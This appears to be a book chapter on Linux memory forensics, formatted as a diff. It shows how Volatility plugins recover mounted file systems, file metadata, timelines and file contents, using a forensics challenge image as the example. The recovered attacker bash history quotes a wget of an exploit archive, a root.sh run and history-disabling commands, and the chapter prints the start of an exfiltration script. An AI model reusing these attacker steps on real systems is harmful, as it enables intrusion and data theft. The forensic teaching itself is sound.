@@ -1,0 +1,831 @@
+24                      File Systems in
+                        Memory
+
+A      s files are opened, created, read, and written, the operating system caches infor-
+       mation about these actions in a number of data structures. The associated artifacts
+include the directory structure, metadata (including timestamps), and even the contents of
+recently accessed files. Particularly on Linux, in which memory-only file systems are used
+on nearly every distribution, such artifacts are lost when the machine is powered down.
+Thus, in many cases, preserving RAM is the best (and sometimes the only) method to
+determine which files an attacker accesses, where a rootkit hides, or what was introduced
+as the result of a client-side browser attack.
+
+Mounted File Systems
+Linux maintains a list of the actively mounted file systems in kernel memory. One of the
+most basic analysis tasks is to locate this list and get an initial impression of which file
+systems were accessible. The direction of your investigation can be affected based on
+whether a file was opened from the local hard disk, over a remote Network File System
+(NFS) or Server Message Block (SMB) drive, or an external USB stick.
+
+Analysis Objectives
+
+Your objectives are these:
+
+   • Identify reconnaissance and snooping: Many companies have internal file servers
+       hosting intellectual property. Any semicompetent attacker will immediately try to
+       find and mount interesting network shares, to either grab specific files or search for
+       any files containing certain terms relevant to the attacker’s motives. If you capture
+       RAM during this time, or if the attacker fails to unmount the share, the artifacts of
+       such activity are present in the memory dump.
+
+            • Detect data exfiltration: Disgruntled employees often bring USB sticks into the
+﻿
+
+              workplace to copy sensitive files and leak them at a later time. If you determine
+              that an external drive was recently used, you should add information about that
+              device to your list of evidence to recover.
+            • Understand Linux mounting conventions: Unlike Windows systems, which gen-
+              erally install everything in the same partition (or at most they use a data and an
+              OS partition), Linux systems use many partitions to store sets of data. Linux can
+              also use temporary, memory-only file systems, which have interesting forensics
+              implications.
+
+         Data Structures
+         Under Linux, the hash table that enables you to find all mounted file system structures is
+         pointed to by the kernel symbol mount_hashtable. Depending on your kernel version, each
+         element in the hash table is either a mount structure (older kernels) or vfsmount structure
+         (newer kernels). This is how the structure appears for a 3.2 64-bit Debian system:
+            >>> dt("vfsmount")
+            'vfsmount' (240 bytes)
+            0x0   : mnt_hash                       ['list_head']
+            0x10 : mnt_parent                      ['pointer', ['vfsmount']]
+            0x18 : mnt_mountpoint                  ['pointer', ['dentry']]
+            0x20 : mnt_root                        ['pointer', ['dentry']]
+            0x28 : mnt_sb                          ['pointer', ['super_block']]
+            0x30 : mnt_pcp                         ['pointer', ['mnt_pcp']]
+            0x38 : mnt_longterm                    ['__unnamed_0x38e']
+            0x40 : mnt_mounts                      ['list_head']
+            0x50 : mnt_child                       ['list_head']
+            0x60 : mnt_flags                       ['int']
+            0x64 : mnt_fsnotify_mask               ['unsigned int']
+            0x68 : mnt_fsnotify_marks              ['hlist_head']
+            0x70 : mnt_devname                     ['pointer', ['char']]
+            0x78 : mnt_list                        ['list_head']
+            0x88 : mnt_expire                      ['list_head']
+            0x98 : mnt_share                       ['list_head']
+            0xa8 : mnt_slave_list                  ['list_head']
+            0xb8 : mnt_slave                       ['list_head']
+            0xc8 : mnt_master                      ['pointer', ['vfsmount']]
+            0xd0 : mnt_ns                          ['pointer', ['mnt_namespace']]
+            0xd8 : mnt_id                          ['int']
+            0xdc : mnt_group_id                    ['int']
+            0xe0 : mnt_expiry_mark                 ['int']
+            0xe4 : mnt_pinned                      ['int']
+            0xe8 : mnt_ghosts                      ['int']
+
+Key Points
+The key points are these:
+
+   • mnt_hash: The list of collisions for a hash value inside mount_hashtable.
+   • mnt_parent: A reference to the parent file system.
+   • mnt_mountpoint: A reference to the directory entry mount point in which this file
+     system is mounted.
+   • mnt_root: A reference to the directory entry for the root of the file system.
+   • mnt_devname: The name of the mounted device (for example, /dev/sda1).
+   • mnt_sb: A pointer to the super_block structure of the mount point. Volatility uses
+     this member to enumerate files and directories in a file system.
+
+  To clarify the difference between a few of the similar sounding members—assume a
+USB drive is mounted on the “/media/external” directory and “/media” is part of the
+root file system. mnt_parent then points to the “/” directory, mnt_mountpoint points to
+“/media”, and mnt_root points to “/”.
+
+Linux Mount Plugin
+The linux_mount plugin recovers each file system and lists the device, mount point, file
+system type, and mount options. As shown in the following output, you can quickly
+determine that the target machine was connected to a remote system (192.168.174.1) at the
+time of the memory acquisition:
+  $ python vol.py --profile=LinuxDebian-3_2x64 -f debian-mount.lime linux_mount
+  Volatility Foundation Volatility Framework 2.4
+  Device      Mount Point        FS Type       Mount Options
+  sysfs       /sys               sysfs         rw,relatime,nosuid,nodev,noexec
+  tmpfs       /run/lock          tmpfs         rw,relatime,nosuid,nodev,noexec
+  proc        /proc              proc          rw,relatime,nosuid,nodev,noexec
+  tmpfs       /run/shm           tmpfs         rw,relatime,nosuid,nodev,noexec
+  devpts      /dev/pts           devpts        rw,relatime,nosuid,noexec
+  tmpfs       /run               tmpfs         rw,relatime,nosuid,noexec
+  udev        /dev                devtmpfs      rw,relatime
+  rpc_pipefs /var/lib/nfs/rpc_pipefs rpc_pipefs      rw,relatime
+  /dev/disk/by-uuid/b2385703-e550-4736-a19f-e8490e5a570e /
+  ext4         rw,relatime
+  //192.168.174.1/user/adam/documents    /mnt/share
+  cifs         ro,relatime
+
+  Each column is recovered in the following manner:
+
+        • Device: The name of the mounted device, populated from the mnt_devname member
+          of vfsmount or mount.
+        • Mount Point: The directory in which the file system is mounted. In the next sec-
+          tion, you learn how these paths are computed.
+        • FS Type: The file system type. Common disk file systems on Linux include ext3,
+          ext4, and XFS. This is recovered from the s_type member of the super_block
+          structure.
+        • Mount Options: The options passed to the mount command to mount the file
+          system. This is recovered from the s_flags member of the super_block structure.
+
+     Common File System Types
+     The following list details the most common Linux file system types. This list also includes
+     the common pseudo-file systems that an investigator will frequently encounter during
+     analysis. For more details on pseudo-file systems, see the “procfs and sysfs” section of
+     Chapter 20. Later in the book, you will see how rootkits hook file system operations (such
+     as the functions used for reading and writing) to deceive live forensics tools.
+
+        • ext3/4: The most frequently used on-disk file systems for Linux systems.
+        • sysfs: A pseudo-file system that is normally mounted at /sys. It exports informa-
+          tion about hardware devices connected to the system.
+        • proc: A pseudo-file system that is mounted at /proc. It exports the list of running
+          processes, active network connections, loaded kernel modules, and settings related
+          to the memory manager. It also allows you to read network settings, such as the
+          MTU for each interface and whether to forward packets.
+        • tmpfs: A memory-only file system generally used for /tmp and /dev/shm.
+        • devpts: A pseudo-file system that is the mount point for pseudo terminals. Each
+          user that logs in to a terminal from a remote location (over protocols such as SSH)
+          receives a pseudo terminal, otherwise known as a command-line interface. For exam-
+          ple, one user would get /dev/pts/0, and another would get /dev/pts/1, and so on.
+        • devtmpfs: A pseudo-file system that manages files and directories under the /dev
+          directory. This directory stores device nodes for physical devices as well as those
+          that software creates (for example, /dev/mem).
+        • cifs: Used to mount remote SMB shares. This is often seen when a Linux system
+          wants to mount remote Windows file shares or when NAS devices are in use on
+          the network.
+
+Mount Options
+The following list shows the most frequently seen mount options and describes their
+impact on a forensics investigation:
+
+   • atime/noatime: Controls whether access times for files are updated. If access times
+     are disabled via this flag (and the others described next that control access times), it
+     can have a huge effect on your ability to determine which files an attacker accessed.
+   • diratime/nodiratime: Controls whether directory access times are updated.
+   • relatime/norelatime: Updates access times only if the access time is older than the
+     last modified time. Since kernel version 2.6.3x, the access time is updated in all
+     cases when it is older than 24 hours.
+   • dev/nodev: Allows or disallows devices to load under a mount point. On restricted
+     file systems and those used as a file system jail (or sandbox), this option often
+     prevents privilege escalation and activity outside of the jail.
+   • exec/noexec: Controls whether files are executed inside the mount point. This is
+     often used as a security mechanism to prevent attackers from downloading and
+     executing binaries in world-writable directories, such as /tmp. If you encounter a
+     system in which /tmp is executable, it is worth investigating for malicious binaries.
+   • suid/nosuid: Controls whether set user ID (SUID) binaries are allowed within the
+     file system. This is another security mechanism that prevents regular users from
+     executing binaries as another user (for example, root). Placing SUID binaries in
+     nonstandard executable directories (/tmp, /var/run, /home/<user>/) is a technique
+     that attackers frequently use as a component of backdoors to regain higher privi-
+     leges on a system.
+   • rw/ro: Marks the file system as read-write or read-only.
+
+ Warning
+ The mount options are important because with root access, attackers can disable secu-
+ rity and auditing features (such as timestamp tracking) as well as enable writing to
+ or executing inside of certain file systems. If you have reason to suspect that this has
+ happened, one thing you can do is compare the current options in memory with the
+ default options from /etc/fstab. If you find discrepancies, you can check with the
+ linux_bash plugin (see Chapter 21), and look specifically for mount commands.
+
+     Temporary File Systems
+     tmpfs is a memory-only file system generally used for /tmp and /dev/shm. As previously
+     mentioned, capturing RAM is critical for analyzing artifacts from these file systems
+     because they simply don’t exist anywhere else. The /tmp directory is used as scratch
+     storage for installations, archive extraction, and other files that do not need to survive a
+     reboot. Likewise, /dev/shm is for shared memory of applications, which has no need to
+     survive a reboot. Due to the volatile nature of these directories, attackers often use them
+     to download files and create backups of data (before exfiltration) without writing to more
+     permanent storage such as a hard disk.
+         Another use of tmpfs is to provide a mutable file system to users within live CDs. The
+     live CD contains the file system and operating system as it is at boot time, and the user
+     cannot write it. To remedy this, live CDs manage layers (stacks) of file systems in uni-
+     son, which is accomplished by having a tmpfs file system as the top layer and then the
+     live CD under it. Writes to the file system are reflected in the top layer, and any file not
+     present in the top layer is then checked for in the bottom layer. This approach supports
+     creating, reading, writing, and deleting of files anywhere in the file system. This process
+     is illustrated in Figure 24-1.
+
+       Firefox         passwd           Apache
+
+                       Kernel
+                 System Calls, IOCTLs
+
+                          All files modified and
+        RAM                created since boot
+
+                          Static files from the
+      CD-ROM                  boot image
+
+     Figure 24-1: File system interactions on live CDs
+
+         In Figure 24-1, you can see several processes (Firefox, /usr/bin/passwd, Apache) that
+     must use kernel services to read, write, and create files. On normal systems, these opera-
+     tions affect a physical hard drive. In the case of live CDs, they go through the previously
+     discussed layers. For example, when a user runs Firefox for the first time from a live CD,
+     it creates a profile directory that includes files such as the browsing history, cookies, and
+     search terms databases. Because these files did not previously exist on the CD (or they
+     existed but need to be changed), they are stored within RAM. Similarly, if a user adds an
+
+account or changes the password of an account, the /etc/passwd file updates. However,
+the changes aren’t written back to the CD. Instead, the CD retains the original contents,
+and the new version of /etc/passwd is stored in memory. The operating system returns
+the data from the in-memory copy when the file is read.
+   Another operation to consider is deletion. If a file stored on the CD is deleted, it must
+then no longer be visible in directory listings, even though it is still physically on the CD.
+The file system driver handles these interactions, which are completely transparent to
+userland processes.
+
+ NOTE
+ The forensics impact of live CDs and how to analyze machines that use them with
+ memory forensics was discussed in a presentation by Andrew Case at the 2011 Blackhat
+ DC conference (see http://www.dfir.org/research/PAPER-De-Anonymizing%20Live%20
+ CDs%20through%20Physical%20Memory%20Analysis.pdf).
+
+Listing Files and Directories
+After you identify file systems, the next step is to enumerate the files and directories inside
+of them. To generically handle the wide range of file systems that Linux supports, the
+Virtual File System (VFS) is used. In this model, all file system operations go through the
+same interface, regardless of the underlying file system type. By leveraging the abstrac-
+tions that the VFS and its data structures provide, Volatility’s Linux support can enumerate
+all file system types and their contents in a generic manner.
+
+Analysis Objectives
+
+Your objectives are these:
+
+   • Determine the files that the system and its applications are using: By enumerating
+     the portions of the file system that are memory-resident, you can determine which
+     files are currently in use. This can point to malicious binaries, malware configu-
+     rations, log files, and more. This list also serves as the set of files whose contents
+     you can potentially recover from memory versus those that were never read into
+     memory or that were removed from the cache.
+   • Identify unknown or unexpected files: Many organizations install end-user and
+     server systems from standard disk images. You can compare the list of files you
+
+            find in memory of a potentially compromised system with the baseline. You can
+﻿
+
+            further narrow the scope by creating timelines of the in-memory files to determine
+            which were used in the attack timeframe.
+
+     Data Structures
+     The dentry structure holds information on a directory entry related to a file or directory.
+     Here is how the structure appears on a 64-bit Debian system:
+        >>> dt("dentry")
+        'dentry' (192 bytes)
+        0x0   : d_flags                        ['unsigned int']
+        0x4   : d_seq                          ['seqcount']
+        0x8   : d_hash                         ['hlist_bl_node']
+        0x18 : d_parent                        ['pointer', ['dentry']]
+        0x20 : d_name                          ['qstr']
+        0x30 : d_inode                         ['pointer', ['inode']]
+        0x38 : d_iname                         ['array', 32, ['unsigned char']]
+        0x58 : d_count                         ['unsigned int']
+        0x5c : d_lock                          ['spinlock']
+        0x60 : d_op                            ['pointer', ['dentry_operations']]
+        0x68 : d_sb                            ['pointer', ['super_block']]
+        0x70 : d_time                          ['unsigned long']
+        0x78 : d_fsdata                        ['pointer', ['void']]
+        0x80 : d_lru                           ['list_head']
+        0x90 : d_u                             ['list_head', {}]
+        0xa0 : d_subdirs                       ['list_head']
+        0xb0 : d_alias                         ['list_head']
+
+     Key Points
+     The key points are these:
+
+        • d_parent: A pointer to the parent directory entry. You can use this pointer to build
+          the directory structure of a file system.
+        • d_name: A qstr (short for quick string) structure that holds the name of the file or
+          directory.
+        • d_inode: A pointer to the corresponding inode structure. You’ll use this pointer to
+          extract metadata associated with the file, as well as the file contents.
+        • d_sb: A pointer to the super_block containing the dentry.
+        • d_u: A union whose d_child member is a pointer into the list of files and directories
+          inside the directory.
+        • d_subdirs: The list of subdirectories inside a directory. Although it is similar to
+          d_u, you need both members to produce an accurate directory listing.
+
+   As previously shown, each file system structure (that is, vfsmount) stores a reference
+to its super_block within the mnt_sb member. To start enumerating files and directories,
+Volatility uses the s_root member of super_block because it stores a reference to the root
+dentry of the file system. At this point, you can walk the d_subdirs list recursively.
+   The following shows the output of the linux_enumerate_files plugin on the memory
+sample that Chapter 21 used to show the infected rm binary:
+  $ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime
+         linux_enumerate_files
+
+  [snip]
+
+  /tmp/rm
+  <snip>
+  /etc/mtab
+  /etc/resolv.conf
+  /etc/gcrypt
+  /etc/hosts
+  /etc/host.conf
+  /etc/suid-debug
+  /etc/ssh
+  /etc/ssh/moduli
+  /etc/cron.hourly
+  /etc/default
+  /etc/default/locale
+  /etc/environment
+  /etc/security
+  /etc/security/limits.d
+  /etc/security/limits.conf
+  /etc/security/pam_env.conf
+  /etc/shadow
+  /etc/pam.d
+  /etc/pam.d/common-session
+  /etc/pam.d/common-password
+  /etc/pam.d/other
+  /etc/pam.d/common-session-noninteractive
+
+  [snip]
+
+    In the full output of the plugin, you can see every file found in memory. In particu-
+lar, you can see the /tmp/rm binary that the attacker planted, as well as several files
+inside of /etc that could be helpful to your investigation. For example, shadow stores the
+encrypted passwords of users; hosts stores hardcoded hostname-to-IP address mappings;
+and resolv.conf stores DNS settings. Malware and attackers often read or write these
+files to control system and network behavior.
+
+     Extracting File Metadata
+﻿
+
+     The names of files and directories are only small pieces of a much larger puzzle. In this
+     section, you will learn how to recover the metadata associated with each file, including
+     its size, MAC times, permissions, owner, and more. You can use this information when
+     you create timelines, determine activity on a per-user basis, and extract the in-memory
+     file system to disk.
+
+     Analysis Objectives
+
+     Your objectives are these:
+
+        • Understand how Volatility recovers file metadata: The inode structure stores
+          all metadata related to a file. Volatility must analyze a number of this structure’s
+          members to properly recover the contained information and allow you to use it.
+        • Create activity timelines: Using the file system’s metadata, you can produce an
+          activity timeline and correlate artifacts based on their temporal relationships.
+        • Distinguish between different users’ files: Metadata also includes user IDs (UIDs)
+          and group IDs (GIDs) per file and directory. Thus, in addition to when a file was cre-
+          ated, you can also determine who created it (unless one user created a file as another
+          user with sudo, or if the initial owner was changed after creation with a command
+          such as chown). You can also use this metadata to identify insecure configurations
+          (that is, a world-readable shadow file) or a setuid binary in a temporary directory.
+
+     Data Structures
+     The inode structure holds metadata for a file in memory. Here is how the structure appears
+     for a 64-bit Debian sample:
+        >>> dt("inode")
+        'inode' (552 bytes)
+        0x0   : i_mode                         ['unsigned short']
+        0x2   : i_opflags                      ['unsigned short']
+        0x4   : i_uid                          ['unsigned int']
+        0x8   : i_gid                          ['unsigned int']
+        0xc   : i_flags                        ['unsigned int']
+        0x10 : i_acl                           ['pointer', ['posix_acl']]
+        0x18 : i_default_acl                   ['pointer', ['posix_acl']]
+        0x20 : i_op                            ['pointer', ['inode_operations']]
+        0x28 : i_sb                            ['pointer', ['super_block']]
+        0x30 : i_mapping                       ['pointer', ['address_space']]
+        0x38 : i_security                      ['pointer', ['void']]
+        0x40 : i_ino                           ['unsigned long']
+
+  <snip>
+  0x50 : i_atime                          ['timespec']
+  0x60 : i_mtime                          ['timespec']
+  0x70 : i_ctime                          ['timespec']
+  0x80 : i_lock                           ['spinlock']
+  <snip>
+  0x90 : i_size                           ['long long']
+  <snip>
+  0x108 : i_dentry                        ['list_head']
+  <snip>
+  0x130 : i_fop                           ['pointer', ['file_operations']]
+  <snip>
+
+Key Points
+The key points are these:
+
+   • i_mode: Encodes the file type (regular, directory, block, socket, and so on) as well
+     as the permissions (read, write, execute) for any owner, group, or other (world).
+   • i_uid and i_gid: The user ID (UID) and GID of the file’s owner. You can use the
+     /etc/passwd and /etc/group files to translate these files to user and group names.
+   • i_op and i_fop: The inode and file operations pointers of the inode. These point-
+     ers control all interactions with the inode and file system drivers. They also play a
+     role in reporting directory listings and file contents to userland processes. Due to
+     this control, malware often hijacks these function pointers.
+   • i_mapping: A pointer to the address_space_operations structure for the file’s
+     data. In the next section, you will learn how to use this member to recover a file’s
+     contents.
+   • i_ino: The inode number uniquely identifies each file and directory in a file system.
+     This number appears in the output of the stat command when run on live Linux
+     systems and in the names of pseudo files (pipes, sockets).
+   • i_mtime, i_atime, and i_ctime: The MAC times of the file. They are used for build-
+     ing timelines and discovering timestamp-altering antiforensics attempts.
+   • i_size: The size of the file, which is used when recovering the file’s contents.
+
+Duplicating File Systems from Memory
+A wide range of file metadata is extractable from the inode structure. Using metadata
+extracted from this structure, Volatility’s linux_recover_filesystem plugin can dump a
+file system’s memory-resident artifacts to disk. As the file system is traversed, Volatility
+re-creates the directory structure it finds in memory and writes each file to disk. Besides
+
+     recovering the file contents, which is explained in the next section, Volatility also tries
+     to maintain the correct metadata. For example, the accessed and modified times of the
+     written file are changed to match those in the memory sample.
+
+       NOTE
+       Unfortunately, the create time is not kept on ext3 file systems, but it is kept on ext4. In
+       either case, modifying the create time is not supported through Python or C; it requires
+       directly changing the time on disk through tools such as debugfs. To avoid such a
+       dependency and to ensure stability, the create time of files is simply not replicated by
+       the linux_recover_filesystem plugin.
+
+         File permissions are also restored. The owning user and group of the file are made
+     to match those of the inode in memory through the Python os.chown function. These
+     artifacts allow you to determine which files were accessible by which users, whether
+     they are executable applications or simply read/write configuration files, and so on. An
+     important piece of metadata that you cannot replicate is the inode number. For example,
+     if you are recovering the file system to a NTFS drive, there is no notion of an inode. When
+     writing to Linux file systems, the destination file system has its own set of inodes that
+     can cause conflicts.
+         The following code shows the use of the linux_recover_filesystem plugin against
+     the 2008 DFRWS forensics challenge. In Chapter 21, you saw the extracted bash history
+     from this same memory sample. That output showed an attacker using anti-forensics (in
+     particular, unset HISTFILE to disable command history) before exfiltrating sensitive data.
+     In the destination file system (the fsout directory, in the example), you can see much of
+     this activity as well as the corresponding metadata:
+        $ sudo python vol.py --profile=Linuxdfrws2008x86 -f challenge.mem
+            linux_recover_filesystem -D fsout
+        Volatility Foundation Volatility Framework 2.4
+        Recovered 12463 files
+
+        $ cat fsout/home/stevev/.bash_history
+        uname -a
+        who
+        ll -h
+        mkdir temp
+        ll -h
+        chmod o-xrw temp/
+        ll -h
+        cd temp/
+        cp /mnt/hgfs/Admin_share/*.xls .
+        cp /mnt/hgfs/Admin_share/*.pcap .
+
+  exit
+  uname -a
+  id
+  exit
+  X -v
+  X -V
+  X -version
+  cd temp
+  wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz
+  tar -zpxvf xmodulepath.tgz
+  cd xmodulepath
+  ll
+  unset HISTORY
+  ./root.sh
+  exit
+  pwd
+  cd ..
+  cp /mnt/hgfs/Admin_share/intranet.vsd .
+  ll
+  ls -lh
+  exit
+
+   Although the .bash_history file from disk for the user stevev is recovered, it is not
+as complete as what is found in memory with the linux_bash plugin because of the anti-
+forensics measures. Within the hgfs file system, you can also find the exfiltration script
+(xfer.pl) as well as sensitive files accessed by the attacker: several Excel documents, a
+Visio network diagram, some text files, and a few compressed archives.
+  $ ls -l fsout/mnt/hgfs/Admin_share/
+  total 784
+  -rw-rw-r-- 1 500 500 141824 Dec 8 2007 acct_prem.xls
+  -rw-rw-r-- 1 500 500 100864 Dec 8 2007 domain.xls
+  -rwxr-xr-x 1 500 500   2395 Aug 5 2000 ftp.pcap
+  -rwxr-xr-x 1 500 500 460288 May 16 2007 intranet.vsd
+  -rw-rw-r-- 1 500 500 10376 Nov 26 2007 libfindrtp-0.4b.tar.gz
+  -rw-rw-r-- 1 500 500    354 Dec 8 2007 negotiation notes.txt
+  -rw-rw-r-- 1 500 500 52493 Nov 26 2007 rtp-stego-code.tgz
+  -rwxrw-r-- 1 500 500   3209 Dec 16 2007 xfer.pl
+
+   In the output of ls on the directory, the original permissions are preserved, and the
+UIDs and GIDs are set as they were on the investigated machine. By using the passwd
+and group files, you can determine the exact user account that owned these files (in this
+case, the user’s name was “user”).
+  $ grep 500 fsout/etc/passwd
+  user:x:500:500:user:/home/user:/bin/bash
+  $ grep 500 fsout/etc/group
+  user:x:500:
+
+        The following output shows the beginning of the exfiltration script. It contains evidence
+     of the HTTP user agent and proxy IP address that the attacker uses. If this file were deleted
+     from the disk immediately after its use, there’s still a chance you could have found it in
+     memory—which is one of the major advantages to dumping files out of RAM.
+        $ head -15 fsout/mnt/hgfs/Admin_share/xfer.pl
+        #!/usr/bin/perl
+        #
+        use strict;
+        use warnings;
+        use MIME::Base64;
+        use vars qw/@urls/;
+
+        my $user_agent = "Mozilla/5.0 (X11; U; Linux i686; en-US) Gecko/20071126";
+        #my $proxy_ip = "219.93.175.67:80";
+        @urls = ( "http://youtube.com/", "http://www.google.com/
+        search?hl=en&q=pig+latin",
+        "http://www.idioma-software.com/pig/pig_latin.html", "http://www.yahoo.com/",
+        "http://mail.yahoo.com/", "http://www.myspace.com/",
+        "http://vids.myspace.com/index.cfm?fuseaction=vids.individual&VideoID=23886700",
+        "http://youtube.com/", "http://youtube.com/watch?v=ZiRHyzjb5SI",
+        "http://youtube.com/watch?v=1RUFBGDvsy0",
+        "http://www.google.com/search?hl=en&q=juicy+fruit",
+        "http://www.wrigley.com/wrigley/products/pop_juicy_fruit.asp",
+        "http://www.amazon.com/Juicy-
+        Fruit-Mtume/dp/B0000025UL", "http://www.facebook.com/", "http://www.live.com/",
+        "http://search.live.com/results.aspx?q=hurricane", "http://www.ebay.com/",
+        "http://books.ebay.com/", "http://photography.ebay.com/",
+        "http://crafts.ebay.com/",
+        "http://en.wikipedia.org/wiki/Main_Page",
+        "http://en.wikipedia.org/wiki/Lee_Smith_\%28baseball_player\%29",
+        "http://en.wikipedia.org/wiki/Lee_Smith_\%28baseball_player\%29&action=edit",
+        "http://www.msn.com/", "http://www.slate.com/id/2179838/?GT1=10733",
+        "http://mail.live.com/",
+        "http://costarica.en.craigslist.org/rfs/",
+        "http://costarica.en.craigslist.org/apa/");
+
+        my @send_data;
+        my $inputfile;
+        my $chunk_size = 1236;
+
+        Recovering the file system from a memory dump and re-creating it on your own analy-
+     sis disk has a number of additional advantages. For example, you can produce a very
+     close approximation to what was actually on the suspect system’s disk (with exception
+     of unallocated space and files that weren’t memory-resident). You can then process your
+     simulated disk with forensics tools such as The Sleuth Kit (see http://www.sleuthkit.org).
+
+ WARNING
+ In order to fully replicate metadata, such as the owner and group of root-owned files,
+ linux_recover_filesystem must be run as root. In the case of kernel-level rootkits, the
+ file system you recover from memory can be fully attacker-controlled. For safety and
+ stability purposes, you should extract the file system to its own partition, not the one
+ from which you are analyzing. linux_recover_filesystem makes an effort to prevent
+ attacks such as directory traversal, but you should exercise caution when analyzing
+ the file system. If you want to avoid this potential attack, you can comment out the
+ line of the plugin that calls os.chown.
+
+Building Timelines
+By using the linux_dentry_cache plugin, you can build timelines from the file system’s
+memory-resident artifacts. This plugin finds instances of dentry structures within the
+kmem_cache of SLAB-based systems and creates a body file from the structures. By using
+the inode structure of dentry, you can retrieve the inode number, owner, permissions,
+size, and MAC times, which are the fields required for the body file. You can then give
+this body file to The Sleuth Kit and a number of other forensics tools to create and analyze
+the timeline.
+   The following shows how to use the linux_dentry_cache plugin to create a body file
+(named body.txt):
+  $ python vol.py --profile=Linuxdfrws-profilex86 -f challenge.mem
+         linux_dentry_cache > body.txt
+  Volatility Foundation Volatility Framework 2.4
+
+  $ grep Admin body.txt
+  0|Admin_share/xfer.pl|262633|0|500|500|3209|1197862134|1197858797|1197861669|0
+  0|Admin_share/intranet.vsd|262647|0|500|500 \
+            |460288|1197861668|1179352760|1197186983|0
+  0|Admin_share/acct_prem.xls|262646|0|500|500 \
+            |141824|1197861980|1197119951|1197119951|0
+  0|Admin_share/domain.xls|262645|0|500|500 \
+            |100864|1197861980|1197119385|1197119385|0
+  0|Admin_share/rtp-stego-code.tgz|262634|0|500|500 \
+            |52493|1197759870|1196121402|1196121402|0
+  0|Admin_share/libfindrtp-0.4b.tar.gz|262635|0|500|500 \
+            |10376|1197758362|1196133287|1196133287|0
+  0|Admin_share/negotiation notes.txt|262638|0|500|500 \
+            |354|1197861668|1197117626|1197117626|0
+  0|Admin_share/ftp.pcap|262640|0|500|500|2395|1197861980|965487240|1197117607|0
+  0|Admin_share|262632|0|500|500|4096|1197862147|1197861669|1197861669|0
+
+        Next, we create a timeline with mactime (from The Sleuth Kit). The –b parameter speci-
+     fies the path to the body file created in the previous command. The –g and –p parameters
+     specify the group and passwd files, respectively, so the output includes translated names
+     instead of IDs. For the sake of brevity, the output of the timeline is filtered to show only
+     those files related to the Admin_share directory. Note that fsout is the directory on the
+     analysis disk in which the file system was dumped by the linux_recover_filesystem
+     plugin.
+        $ mactime -b body.txt -d
+               -g fsout/etc/group -p fsout/etc/passwd | grep Admin_share
+        Wed Dec 31 1969 18:00:00,4096,...b,0,user,user,262632,"Admin_share"
+        Wed Dec 31 1969 18:00:00,3209,...b,0,user,user,262633,"Admin_share/xfer.pl"
+        Wed Dec 31 1969 18:00:00,52493,...b,0,user,user,262634, \
+                    "Admin_share/rtp-stego-code.tgz"
+        Wed Dec 31 1969 18:00:00,10376,...b,0,user,user,262635, \
+                    "Admin_share/libfindrtp-0.4b.tar.gz"
+        Wed Dec 31 1969 18:00:00,354,...b,0,user,user,262638, \
+                    "Admin_share/negotiation notes.txt"
+        Wed Dec 31 1969 18:00:00,2395,...b,0,user,user,262640,"Admin_share/ftp.pcap"
+        Wed Dec 31 1969 18:00:00,100864,...b,0,user,user,262645,"Admin_share/domain.xls"
+        Wed Dec 31 1969 18:00:00,141824,...b,0,user,user,262646, \
+                    "Admin_share/acct_prem.xls"
+
+        [snip]
+
+        Sat Dec 08 2007 07:19:11,141824,m.c.,0,user,user,262646, \
+                    "Admin_share/acct_prem.xls"
+        Sun Dec 09 2007 01:56:23,460288,..c.,0,user,user,262647, \
+                    "Admin_share/intranet.vsd"
+        Sat Dec 15 2007 16:39:22,10376,.a..,0,user,user,262635, \
+                    "Admin_share/libfindrtp-0.4b.tar.gz"
+        Sat Dec 15 2007 17:04:30,52493,.a..,0,user,user,262634, \
+                    "Admin_share/rtp-stego-code.tgz"
+        Sun Dec 16 2007 20:33:17,3209,m...,0,user,user,262633, \
+                    "Admin_share/xfer.pl"
+        Sun Dec 16 2007 21:21:08,354,.a..,0,user,user,262638, \
+                    "Admin_share/negotiation notes.txt"
+        Sun Dec 16 2007 21:21:08,460288,.a..,0,user,user,262647, \
+                    "Admin_share/intranet.vsd"
+        Sun Dec 16 2007 21:21:09,4096,m.c.,0,user,user,262632,"Admin_share"
+        Sun Dec 16 2007 21:21:09,3209,..c.,0,user,user,262633,"Admin_share/xfer.pl"
+        Sun Dec 16 2007 21:26:20,2395,.a..,0,user,user,262640,"Admin_share/ftp.pcap"
+        Sun Dec 16 2007 21:26:20,100864,.a..,0,user,user,262645,"Admin_share/domain.xls"
+        Sun Dec 16 2007 21:26:20,141824,.a..,0,user,user,262646, \
+                    "Admin_share/acct_prem.xls"
+        Sun Dec 16 2007 21:28:54,3209,.a..,0,user,user,262633,"Admin_share/xfer.pl"
+        Sun Dec 16 2007 21:29:07,4096,.a..,0,user,user,262632,"Admin_share"
+
+Recovering File Contents
+Arguably the most powerful capability introduced in this chapter is to recover the contents
+of files that are present in the memory dump. This is possible because Linux uses a page
+cache to save information read from disk. The cache prevents the operating system (OS)
+from needing to reread the same data on subsequent requests. Linux also implements a
+read-ahead cache that loads subsequent portions of a file into memory once an application
+has read previous ones—in an attempt to save disk access and boost performance. As a
+result, portions of a file are copied into memory, even if an application has not explicitly
+used or requested them. Thus, an investigator can extract information about the data that
+was actively being accessed, including the context found in surrounding data.
+
+Analysis Objectives
+
+Your objectives are these:
+
+   • Recover malware and attacker files from memory: As attackers create files and
+     execute malware from disk, the pages of the files are first read into the page cache.
+     As you perform memory analysis, you will often find references to files that you
+     want to analyze. Common examples include the shadow file with the password
+     hashes for all user accounts, web scripts (that is, PHP shells) that attackers use
+     as backdoors, log files of key loggers or stolen credentials, and malware code
+     segments.
+   • Determine the most recently used files on the system: Files are placed into the
+     page cache when they are read or executed. This ensures the most recently used
+     files are accessible in memory. A negative side effect is that relevant—but not
+     recently accessed files—may be expunged from the cache.
+
+Data Structures
+The address_space structure holds information on a file’s mapping within the page cache:
+  >>> dt("address_space")
+  'address_space' (168 bytes)
+  0x0   : host                            ['pointer', ['inode']]
+  0x8   : page_tree                       ['radix_tree_root']
+  0x18 : tree_lock                        ['spinlock']
+  0x1c : i_mmap_writable                  ['unsigned int']
+  0x20 : i_mmap                           ['prio_tree_root']
+  0x30 : i_mmap_nonlinear                 ['list_head']
+  0x40 : i_mmap_mutex                     ['mutex']
+  0x60 : nrpages                          ['unsigned long']
+
+        0x68   : writeback_index                 ['unsigned long']
+﻿
+
+        0x70   : a_ops                           ['pointer', ['address_space_operations']]
+        0x78   : flags                           ['unsigned long']
+        0x80   : backing_dev_info                ['pointer', ['backing_dev_info']]
+        0x88   : private_lock                    ['spinlock']
+        0x90   : private_list                    ['list_head']
+        0xa0   : assoc_mapping                   ['pointer', ['address_space']
+
